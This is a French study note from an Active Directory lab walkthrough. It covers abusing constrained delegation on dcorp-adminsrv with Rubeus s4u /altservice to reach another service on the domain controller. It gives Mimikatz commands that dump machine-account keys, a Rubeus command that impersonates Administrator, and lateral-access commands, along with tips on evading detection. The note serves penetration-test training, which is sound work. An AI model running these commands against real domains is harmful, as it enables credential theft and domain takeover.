---
flag: 27
machine: dcorp-adminsrv
statut: à faire
technique: Constrained delegation (S4U + altservice)
LO: "[[LO16 - Constrained delegation]]"
---

# F27 - Service alternatif via constrained deleg

> [!summary] Objectif
> En abusant la constrained delegation de `dcorp-adminsrv`, obtenir un ticket vers `dcorp-dc` mais pour un **autre service** que celui liste dans `msDS-AllowedToDelegateTo` (astuce `/altservice` de Rubeus).

## Contexte
- **Etape attack flow**: exploit constrained delegation ([[LO16 - Constrained delegation]]) — apres avoir la cle AES/hash du compte delegue, S4U2Self + S4U2Proxy, puis on switch le service dans le ST.
- **Ce qu on a**: `msDS-AllowedToDelegateTo` de `dcorp-adminsrv` connu (voir [[F26 - Valeur msds-allowedtodelegateto adminsrv]]), et hash/AES du compte machine `dcorp-adminsrv$` (via extraction locale ou DCSync).
- **Ce qu on cherche**: le nom du service alternatif (SPN class) qui donne l'acces exploitable sur `dcorp-dc`.

## Solution

### Etape 1: recuperer les cles machine de adminsrv
```powershell
# Sur dcorp-adminsrv (admin local requis)
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
# ou via LSA
Invoke-Mimikatz -Command '"lsadump::secrets"'
```
→ Voir [[Cheatsheet - Persistence]] et [[Cheatsheet - Privilege escalation]].

### Etape 2: S4U avec altservice
```powershell
# altservice = service alternatif qu on veut atteindre sur dcorp-dc
# (le service liste dans msds-allowedtodelegateto est le "port d entree", altservice le "vrai" cible)
C:\AD\Tools\Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:<AES256_ADMINSRV$> `
  /impersonateuser:Administrator /msdsspn:<SPN_LISTE_DANS_ATTRIBUT> `
  /altservice:<SERVICE_ALTERNATIF> /ptt
```
→ Voir [[Cheatsheet - Delegation attacks]] (section Abuse constrained S4U).

### Etape 3: utiliser le ticket injecte
```powershell
# Selon le service demande dans altservice
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$      # cifs
Enter-PSSession dcorp-dc                          # host / rpcss
winrs -r:dcorp-dc cmd                             # http (winrm)
```

## Reponse

| Element | Valeur |
|---------|--------|
| Service alternatif accessible via S4U sur dcorp-dc | <A REMPLIR DEPUIS LAB> |

## Pieges et OPSEC
- La KDC ne verifie **pas** le SPN encode dans le ST cote client — Rubeus reecrit le champ `sname` d'ou l'`/altservice`. Ca marche uniquement en RC4/AES symetrique classique (pas si le compte est marque "sensitive / cannot be delegated").
- Si `Administrator` est dans `Protected Users` ou marque non-delegable, l'impersonation echoue.
- 4769 sur le DC avec `Service Name = <SPN>` — trafic bruyant si SIEM regarde S4U2Proxy.
- Ne pas confondre `altservice` (change le service dans le meme ST) et un vrai second S4U (nouveau tour).

## Refs
- [[Cheatsheet - Delegation attacks]]
- [[Cheatsheet - Persistence]]
- [[LO16 - Constrained delegation]]
- [[F26 - Valeur msds-allowedtodelegateto adminsrv]]
- [[Synthèse - Kerberos]]
